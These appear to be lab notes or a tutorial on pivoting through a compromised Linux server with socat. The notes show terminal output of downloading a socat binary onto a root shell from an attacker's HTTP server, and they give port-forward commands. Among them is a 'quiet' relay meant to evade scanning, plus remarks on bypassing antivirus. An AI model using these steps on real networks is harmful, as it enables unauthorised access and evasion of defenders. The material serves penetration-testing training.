# `Local Port forwarding with Socat`

Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. 

The one big disadvantage of socat, is that it is very rarely installed by default on a target. 


In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or create a port forward.

************************************************************

Before using we need to upload Staatic Binary on Compromised Server in order to access Target

Static binaries are easy to find for both Linux and Windows. 

Linux - https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

Windows - https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download

Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.

──(kali㉿kali)-[~/Downloads]
└─$ `python -m http.server 80`
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

[root@prod-serv ~]# `curl -O http://10.50.138.14/socat`
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  366k  100  366k    0     0   325k      0  0:00:01  0:00:01 --:--:--  325k
[root@prod-serv ~]# `ls`
anaconda-ks.cfg  socat



# Normal - Port Forwarding with Socat (by opening a port on compromised server)

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.


For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:

`/socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

The `fork` option is used to put every connection into a new process, 
The `reuseaddr` option means that the port stays open after a connection is made to it
`&` is to background the shell
****************************************************************************************************************

For Example

    Attacker PC                                         10.200.141.200                                                 10.200.141.150
    (SSH Client)                                         (SSH Server)                                                  (Target Server)
 (Attacker Machine)                                    (Compromised Server)



 ┌──(kali㉿kali)-[~/Downloads]
└─$ `python -m http.server 80 `                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


[root@prod-serv ~]# `curl -O http://10.50.138.14/socat`
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  366k  100  366k    0     0   380k      0 --:--:-- --:--:-- --:--:--  380k
[root@prod-serv ~]# 

[root@prod-serv ~]# `chmod +x socat`


we could use the following command (on the compromised server) to create a port forward:


[root@prod-serv ~]# `./socat tcp-l:9090,fork,reuseaddr tcp:10.200.141.150:80 &`
[1] 2119
[root@prod-serv ~]# 



This opens up port 9090 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the  http web service running on our target of 10.200.141.150


┌──(kali㉿kali)-[~/Downloads]
└─$ `curl http://10.200.141.200:9090`

<!DOCTYPE html>
<html lang="en">
<head>
.
.
.
.
.

# Quiet - Port Forwarding with Socat (without opening any port on Compromised server)

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning.

This another method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:

`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: `8000 and 8001`, creating a local port relay. What goes into one of them will come out of the other, For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:

`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`


For Example

┌──(kali㉿kali)-[~/Downloads]
└─$ `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
[1] 7173
            

[root@prod-serv ~]# `./socat tcp:10.50.130.14:8001 tcp:10.200.141.150:80,fork &`
[1] 2476


This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (10.200.141.150), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 10.200.141.150:80!


This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

    The request goes to 127.0.0.1:8000
    Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
    Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

    The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
    Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

We have now achieved the same thing as previously, but without opening any ports on the server!
